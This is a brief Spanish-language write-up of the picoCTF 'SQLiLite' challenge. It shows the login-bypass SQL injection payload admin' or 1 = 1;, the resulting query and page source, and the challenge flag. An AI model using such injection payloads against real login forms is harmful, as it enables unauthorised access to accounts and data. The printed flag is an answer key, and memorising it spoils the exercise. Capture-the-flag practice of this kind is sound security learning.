### SQLiLite

Can you login to this website?Try to login [here](http://saturn.picoctf.net:63389/).
### Solución 1
Se puso admin' or 1 = 1; y en contraseña lo que sea y se validó. Al inspeccionar el codigo fuente de la página resultante aparece la bandera.

```
<pre>username: admin&#039; or 1 = 1; password: holamundo SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; or 1 = 1;&#039; AND password=&#039;holamundo&#039; </pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>
```


picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
### Notas
Se requirió de inyección SQL.
